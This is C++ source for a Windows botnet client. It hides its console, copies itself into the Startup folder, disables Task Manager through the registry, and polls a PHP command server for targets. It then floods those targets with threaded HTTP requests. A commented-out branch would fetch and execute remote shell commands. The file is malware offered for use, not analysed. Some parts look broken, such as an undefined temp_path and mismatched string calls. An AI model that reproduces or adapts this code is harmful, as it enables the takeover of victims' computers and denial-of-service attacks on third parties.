#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "External/binaryhandling.hpp"
#include "External/httplib.h"
#include "External/URLparse.hpp"
#include <random>
#include <string>
#include <thread>
#include <vector>
#ifdef _WIN32
#include <windows.h>
#include <winreg.h>

#pragma comment(lib, "user32")
#pragma comment(lib, "advapi32")
#endif

#pragma comment(lib, "libcrypto")
#pragma comment(lib, "libssl")

// Replace It with the server link or IP where PHP server is running
// The PHP files to put on server is in server directory.
// This enhances and make runnable the original source code, doesn't add more 
#define SERVER_URL "https://zombie-panel-host"
#define USERAG "gg"

/*
MIT License

Copyright (c) 2022 nk125

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

void runInBackground();
void saveStartup(char* argv[]);
std::string makeRequest(std::string method, std::string uri);
void startDDOS(std::string link, std::string iterations);
std::string randomString(int n);
std::string bot_id = randomString(6);
std::string UAG_SV = "Zombie/1.0 (Bot; " + bot_id + ")";

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");

    if (!pipe) throw std::runtime_error("popen() failed!");

    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }

    _pclose(pipe);
    return result;
}

#ifdef _WIN32
void deact_taskmgr() {
    DWORD dwVal = 1;

    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx (hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
    RegCloseKey(hKey);
}
#endif

int main(int argc, char* argv[]) {
	std::string attackFlag;

#ifdef _WIN32
	// Run process in background
	runInBackground();

	// Save to startup
	saveStartup(argv);

    	deact_taskmgr();
#endif

	// Life of worm begins here
	while (1) {
		attackFlag = makeRequest("GET", "attack.php?bot_id=" + bot_id);
		if (attackFlag == "1") {
            		std::string link;
            		std::string iterations;
			link = makeRequest("GET", "link.php");
			iterations = makeRequest("GET", "itr.php");
			startDDOS(link, iterations);
		}
		/*
		else if (attackFlag == "2") {
            		const char* cmd = makeRequest("GET", "getcmd.php").c_str();
            		try {
                		std::thread t_ex(exec, cmd);
                		t_ex.detach();
            		}
            		catch (...) {}
		}
		Experimental
		*/
		else {
		    std::this_thread::sleep_for(std::chrono::milliseconds(1800));
        	}
	}

	return 0;
}

/*
* =======================================================================================
* RUN AS BACKGROUND PROCESS -> return void
* =======================================================================================
*/
#ifdef _WIN32
void runInBackground() {
	HWND window;
  	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}
#endif

/*
* =======================================================================================
* SAVE TO STARTUP FOLDER -> return void
* =======================================================================================
*/
#ifdef _WIN32
void saveStartup(char* argv[]) {
    std::string path = std::string{getenv("appdata")} + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    nk125::binary_file_handler b;
    try {
        b.copy_file(string{argv[0]}, path + randomString(64) + ".exe");
        b.copy_file(temp_path + "libcrypto-1_1.dll", path + "libcrypto-1_1.dll");
        b.copy_file(temp_path + "libssl-1_1.dll", path + "libssl-1_1.dll");
	    
	/*
	    ATTENTION:
	      IF YOU USE STATIC OPENSSL BUILD REMOVE THE LAST 2 LINES
	*/
    }
    catch (...) {
        return;
    }
}
#endif

/*
* =======================================================================================
* DDOS ATTACK FUNCTION -> return void
* =======================================================================================
*/
void startDDOS(std::string link, std::string iterations) {
    int it;
    url u(link);
    if (u.host_.empty()) return;
    std::string url_p = (u.protocol_.empty() ? "http" : u.protocol_) + "://" + u.host_;
    std::string path = (u.path_.empty() ? "/" : u.path_);

    try {
        it = std::stoi(iterations);
    }
    catch (...) {
        return;
    }

    auto lambda_http = [&] (){
        httplib::Client c(url_p);
        c.set_keep_alive(true);
        c.set_follow_location(true);

        httplib::Headers h {
            {"User-Agent", USERAG}
        };
        auto r = c.Get(path.c_str(), h);
    };

    for (unsigned i = 0; i < it; i++) {
        try {
            std::thread getreq(lambda_http);
            getreq.detach();
        }
        catch (...) {
            i--;
        }
    }
}

/*
* =======================================================================================
* MAKE REQUEST FUNCTION -> returns response string
* =======================================================================================
*/
std::string makeRequest(std::string method, std::string uri) {
    if (SERVER_URL == "") return "";

    httplib::Client c(SERVER_URL);
    c.set_keep_alive(true);
    c.set_follow_location(true);
    httplib::Headers h {
        {"User-Agent", UAG_SV}
    };

    if (method == "GET") {
        auto r = c.Get(std::string{"/" + uri}.c_str());
        if (r) {
            return r->body;
        }
        else {
            return "";
        }
    }

    return "";
}


/*
* =======================================================================================
* -----------------------------UTIL FUNCTIONS HERE ONLY----------------------------------
* =======================================================================================
*/
std::string randomString(int n) {
    std::random_device rd;
    std::mt19937 mt(rd());
    std::vector<char> alpha = {"abcdefghijklmnopqrstuvwxyz"
                   "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                   "0123456789"
                   "9876543210"};

    std::uniform_int_distribution<> uint(0, alpha.size() - 1);
    
    std::string res;
    res.reserve(n);
    
    for (int i = 0; i < n; i++) {
        res.append(alpha.at(uint(mt)));
    }

    return res;
}
